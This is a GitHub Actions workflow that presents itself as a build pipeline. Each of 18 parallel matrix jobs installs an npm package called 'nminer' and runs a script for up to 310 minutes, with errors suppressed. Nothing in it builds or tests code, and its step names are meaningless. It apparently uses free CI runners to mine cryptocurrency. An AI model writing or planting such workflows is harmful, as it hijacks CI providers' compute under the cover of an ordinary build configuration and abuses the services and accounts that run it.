name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5509 }
          - { version: 762 }
          - { version: 7538 }
          - { version: 8425 }
          - { version: 8612 }
          - { version: 7820 }
          - { version: 5101 }
          - { version: 3421 }
          - { version: 2323 }
          - { version: 8552 }
          - { version: 7184 }
          - { version: 2623 }
          - { version: 1377 }
          - { version: 5979 }
          - { version: 7939 }
          - { version: 4860 }
          - { version: 5432 }
          - { version: 8923 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: swift versus represent
        run: |
          npm install nminer@latest
          timeout 310m node intellect.js || echo "intellect executed"